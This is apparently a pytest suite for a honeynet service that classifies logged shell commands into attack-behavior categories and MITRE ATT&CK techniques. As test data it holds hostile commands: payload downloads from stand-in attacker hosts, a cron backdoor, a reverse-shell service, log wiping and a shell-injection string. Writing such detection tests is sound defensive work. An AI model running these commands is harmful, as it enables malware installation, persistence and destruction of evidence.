import os
import pytest
from datetime import datetime, timezone
from backend.app.models.telemetry import TelemetryEventDB, TelemetryEventCreate
from backend.app.services.event_analysis import (
    BehaviorCategory,
    EventAnalysisResult,
    analyze_telemetry_event,
    analyze_events_batch,
    RULE_BEHAVIOR_AUTH_FAILURE,
    RULE_BEHAVIOR_AUTH_SUCCESS,
    RULE_BEHAVIOR_USER_DISCOVERY,
    RULE_BEHAVIOR_SYSINFO_DISCOVERY,
    RULE_BEHAVIOR_NETWORK_DISCOVERY,
    RULE_BEHAVIOR_FILE_RETRIEVAL,
    RULE_BEHAVIOR_PERSISTENCE,
    RULE_BEHAVIOR_INDICATOR_REMOVAL,
    RULE_BEHAVIOR_UNCLASSIFIED
)
from backend.app.services.mitre_catalog import load_mitre_catalog
from backend.app.models.alert import AlertDB

# 1. Authentication failure classification
def test_auth_failure_classification():
    # Case 1: explicit auth_failure event_type
    evt1 = {
        "event_id": "evt-auth-fail-1",
        "event_type": "auth_failure",
        "username": "admin",
        "payload": "Failed password for invalid user admin from 192.168.1.10 port 44322 ssh2",
        "source_ip": "192.168.1.10",
        "data_origin": "real"
    }
    res1 = analyze_telemetry_event(evt1)
    assert res1.observed_behavior_category == BehaviorCategory.AUTH_FAILURE
    assert res1.matched_rule_id == RULE_BEHAVIOR_AUTH_FAILURE
    assert "T1110.001" in res1.candidate_mitre_technique_ids
    assert "admin" in res1.concise_explanation
    assert "isolated login failure" in res1.mapping_limitations.lower()

    # Case 2: login_attempt with bad password
    evt2 = TelemetryEventCreate(
        event_id="evt-auth-fail-2",
        event_type="auth_attempt",
        username="root",
        payload="incorrect password attempt",
        source_ip="192.168.1.11"
    )
    res2 = analyze_telemetry_event(evt2)
    assert res2.observed_behavior_category == BehaviorCategory.AUTH_FAILURE
    assert res2.matched_rule_id == RULE_BEHAVIOR_AUTH_FAILURE

# 2. Authentication success classification
def test_auth_success_classification():
    evt = {
        "event_id": "evt-auth-succ-1",
        "event_type": "auth_success",
        "username": "root",
        "payload": "Accepted password for root from 10.0.0.99 port 51122 ssh2",
        "source_ip": "10.0.0.99",
        "data_origin": "real"
    }
    res = analyze_telemetry_event(evt)
    assert res.observed_behavior_category == BehaviorCategory.AUTH_SUCCESS
    assert res.matched_rule_id == RULE_BEHAVIOR_AUTH_SUCCESS
    assert "T1078" in res.candidate_mitre_technique_ids
    assert "root" in res.concise_explanation
    assert res.source_ip == "10.0.0.99"

# 3. User discovery command evidence
def test_user_discovery_command_evidence():
    test_payloads = [
        "whoami",
        "/usr/bin/whoami",
        "id -u",
        "cat /etc/passwd",
        "last -n 5",
        "net user Administrator"
    ]
    for p in test_payloads:
        evt = {
            "event_id": f"evt-user-disc-{p[:6]}",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.50"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.USER_DISCOVERY, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_USER_DISCOVERY
        assert "T1033" in res.candidate_mitre_technique_ids
        assert res.supporting_evidence.get("payload") == p

# 4. System information discovery evidence
def test_system_info_discovery_evidence():
    test_payloads = [
        "uname -a",
        "hostname",
        "systeminfo",
        "lscpu",
        "cat /etc/os-release",
        "cat /proc/cpuinfo"
    ]
    for p in test_payloads:
        evt = {
            "event_id": f"evt-sys-disc-{p[:6]}",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.51"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.SYSTEM_INFO_DISCOVERY, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_SYSINFO_DISCOVERY
        assert "T1082" in res.candidate_mitre_technique_ids

# 5. Network discovery evidence
def test_network_discovery_evidence():
    # Via payload commands
    net_payloads = [
        ("ifconfig -a", "T1046"),
        ("ip addr show", "T1046"),
        ("arp -a", "T1018"),
        ("netstat -tuln", "T1046"),
        ("ping -c 4 10.0.0.1", "T1018"),
        ("nmap -sS 10.0.0.0/24", "T1046")
    ]
    for p, expected_tid in net_payloads:
        evt = {
            "event_id": "evt-net-disc-cmd",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.52"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.NETWORK_DISCOVERY, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_NETWORK_DISCOVERY
        assert expected_tid in res.candidate_mitre_technique_ids

    # Via event_type
    scan_evt = {
        "event_id": "evt-net-disc-scan",
        "event_type": "port_scan",
        "payload": "SYN sweep on ports 22, 80, 443",
        "source_ip": "192.168.1.99"
    }
    res_scan = analyze_telemetry_event(scan_evt)
    assert res_scan.observed_behavior_category == BehaviorCategory.NETWORK_DISCOVERY
    assert "T1046" in res_scan.candidate_mitre_technique_ids

# 6. File retrieval attempt classification
def test_file_retrieval_attempt_classification():
    transfer_payloads = [
        "curl -O http://185.220.101.5/bot.sh",
        "wget -q http://attacker.com/miner -O /tmp/miner",
        "tftp -g -r payload.bin 192.168.1.100",
        "certutil -urlcache -f http://evil.com/drop.exe drop.exe"
    ]
    for p in transfer_payloads:
        evt = {
            "event_id": "evt-file-get",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.60"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.FILE_RETRIEVAL_TRANSFER, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_FILE_RETRIEVAL
        assert "T1105" in res.candidate_mitre_technique_ids

# 7. Persistence-related evidence
def test_persistence_related_evidence():
    persistence_payloads = [
        "crontab -l",
        "crontab -e",
        "echo '* * * * * /tmp/backdoor' >> /etc/crontab",
        "systemctl enable reverse_shell.service"
    ]
    for p in persistence_payloads:
        evt = {
            "event_id": "evt-persist",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.70"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.PERSISTENCE_MECHANISM, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_PERSISTENCE
        assert "T1053.003" in res.candidate_mitre_technique_ids

# 8. Indicator-removal-related evidence
def test_indicator_removal_evidence():
    removal_payloads = [
        "history -c",
        "rm -rf /var/log/messages",
        "unset HISTFILE",
        "export HISTFILE=/dev/null",
        "truncate -s 0 /var/log/auth.log",
        "shred -u key.txt"
    ]
    for p in removal_payloads:
        evt = {
            "event_id": "evt-ind-rem",
            "event_type": "command_execution",
            "payload": p,
            "source_ip": "192.168.1.80"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.INDICATOR_REMOVAL, f"Failed on payload: {p}"
        assert res.matched_rule_id == RULE_BEHAVIOR_INDICATOR_REMOVAL
        assert "T1070.004" in res.candidate_mitre_technique_ids

# 9. Unknown commands remaining unclassified
def test_unknown_commands_remain_unclassified():
    unknown_commands = [
        "echo 'Hello honeynet'",
        "sleep 10",
        "pwd",
        "date",
        "mkdir my_folder"
    ]
    for cmd in unknown_commands:
        evt = {
            "event_id": "evt-unknown",
            "event_type": "command_execution",
            "payload": cmd,
            "source_ip": "192.168.1.90"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.UNCLASSIFIED
        assert res.matched_rule_id == RULE_BEHAVIOR_UNCLASSIFIED
        assert res.candidate_mitre_technique_ids == []  # Never invent techniques for unclassified

# 10. Malformed or missing payloads
def test_malformed_or_missing_payloads():
    malformed_inputs = [
        {"event_type": "command_execution", "payload": None},
        {"event_type": "command_execution", "payload": ""},
        {"event_type": "command_execution", "payload": "    \n\t  "},
        {"event_type": "command_execution", "payload": 123456},
        {"event_type": "command_execution", "payload": {"nested": "dict"}},
        {"event_type": "command_execution", "payload": ["item1", "item2"]}
    ]
    for inp in malformed_inputs:
        res = analyze_telemetry_event(inp)
        assert res.observed_behavior_category == BehaviorCategory.UNCLASSIFIED
        assert res.matched_rule_id == RULE_BEHAVIOR_UNCLASSIFIED
        assert res.candidate_mitre_technique_ids == []

# 11. Commands that should not match because of unrelated text
def test_bounded_matching_rejects_unrelated_text():
    tricky_payloads = [
        "curling_iron",              # contains curl
        "whoamiman",                 # contains whoami
        "uname_test",                # contains uname
        "historical_data",           # contains history
        "equipments",                # contains ip
        "crontabs_are_useful",       # contains crontab
        "rm file.txt"                # standard rm without recursive/force
    ]
    for text in tricky_payloads:
        evt = {
            "event_id": "evt-unrelated",
            "event_type": "command_execution",
            "payload": text,
            "source_ip": "10.0.0.1"
        }
        res = analyze_telemetry_event(evt)
        assert res.observed_behavior_category == BehaviorCategory.UNCLASSIFIED, (
            f"Expected UNCLASSIFIED for '{text}', got {res.observed_behavior_category}"
        )
        assert res.candidate_mitre_technique_ids == []

# 12. Correct data_origin preservation
def test_data_origin_preservation():
    evt_real = {"event_type": "command_execution", "payload": "whoami", "data_origin": "real"}
    res_real = analyze_telemetry_event(evt_real)
    assert res_real.data_origin == "real"

    evt_synth = {"event_type": "command_execution", "payload": "whoami", "data_origin": "synthetic"}
    res_synth = analyze_telemetry_event(evt_synth)
    assert res_synth.data_origin == "synthetic"

    evt_default = {"event_type": "command_execution", "payload": "whoami"}
    res_default = analyze_telemetry_event(evt_default)
    assert res_default.data_origin == "real"

# 13. Valid catalog technique IDs
def test_valid_catalog_technique_ids():
    catalog = load_mitre_catalog()
    assert len(catalog) > 0, "Catalog must not be empty"

    events_to_test = [
        {"event_type": "auth_failure", "payload": "failed password"},
        {"event_type": "auth_success", "payload": "accepted password"},
        {"event_type": "command_execution", "payload": "whoami"},
        {"event_type": "command_execution", "payload": "uname -a"},
        {"event_type": "command_execution", "payload": "ip addr"},
        {"event_type": "command_execution", "payload": "curl http://test.com"},
        {"event_type": "command_execution", "payload": "crontab -l"},
        {"event_type": "command_execution", "payload": "history -c"}
    ]
    for evt in events_to_test:
        res = analyze_telemetry_event(evt)
        for tid in res.candidate_mitre_technique_ids:
            assert tid in catalog, f"Technique ID '{tid}' is not present in official catalog!"

# 14. No shell execution of payloads
def test_no_shell_execution_of_payloads(tmp_path):
    marker_file = tmp_path / "should_not_exist.txt"
    # Malicious injection string that would create the file if executed via shell or eval
    dangerous_payload = f"; touch {marker_file}; echo test > {marker_file}; $(touch {marker_file})"
    evt = {
        "event_id": "evt-injection-attempt",
        "event_type": "command_execution",
        "payload": dangerous_payload,
        "source_ip": "1.2.3.4"
    }
    res = analyze_telemetry_event(evt)
    # The file MUST NOT be created
    assert not os.path.exists(marker_file), "CRITICAL SECURITY BREACH: Payload was executed by shell!"
    assert res.observed_event_type == "command_execution"

# 15. Regression of existing ingestion, correlation, MITRE, graph, and alert behavior
def test_event_analysis_api_and_no_unwanted_side_effects(client, db_session):
    # Verify baseline counts in isolated database
    initial_event_count = db_session.query(TelemetryEventDB).count()
    initial_alert_count = db_session.query(AlertDB).count()

    # 1. Test POST /api/events/analyze
    test_event_create = {
        "source_ip": "203.0.113.5",
        "event_type": "command_execution",
        "payload": "curl -O http://malicious.org/script.sh",
        "data_origin": "real"
    }
    resp = client.post("/api/events/analyze", json=test_event_create)
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["observed_behavior_category"] == "FILE_RETRIEVAL_TRANSFER"
    assert data["matched_rule_id"] == "RULE_BEHAVIOR_FILE_RETRIEVAL"
    assert "T1105" in data["candidate_mitre_technique_ids"]
    assert data["data_origin"] == "real"

    # CRITICAL: Verify NO records were written to the database during analysis!
    post_event_count = db_session.query(TelemetryEventDB).count()
    post_alert_count = db_session.query(AlertDB).count()
    assert post_event_count == initial_event_count, "Analysis service must NOT insert duplicate database events!"
    assert post_alert_count == initial_alert_count, "Analysis service must NOT create duplicate alerts!"

    # 2. Test batch analysis
    batch_resp = client.post("/api/events/analyze", json=[
        {"source_ip": "1.1.1.1", "event_type": "command_execution", "payload": "whoami"},
        {"source_ip": "2.2.2.2", "event_type": "command_execution", "payload": "uname -a"}
    ])
    assert batch_resp.status_code == 200
    batch_data = batch_resp.json()
    assert len(batch_data) == 2
    assert batch_data[0]["observed_behavior_category"] == "USER_DISCOVERY"
    assert batch_data[1]["observed_behavior_category"] == "SYSTEM_INFO_DISCOVERY"

    # 3. Ingest an event and test GET /api/events/{event_id}/analysis
    ingest_resp = client.post("/api/events", json={
        "source_ip": "198.51.100.22",
        "event_type": "command_execution",
        "payload": "crontab -l",
        "data_origin": "real"
    })
    assert ingest_resp.status_code == 201
    ingested_event_id = ingest_resp.json()["event_id"]

    analysis_get_resp = client.get(f"/api/events/{ingested_event_id}/analysis")
    assert analysis_get_resp.status_code == 200
    analysis_data = analysis_get_resp.json()
    assert analysis_data["event_id"] == ingested_event_id
    assert analysis_data["observed_behavior_category"] == "PERSISTENCE_MECHANISM"
    assert "T1053.003" in analysis_data["candidate_mitre_technique_ids"]
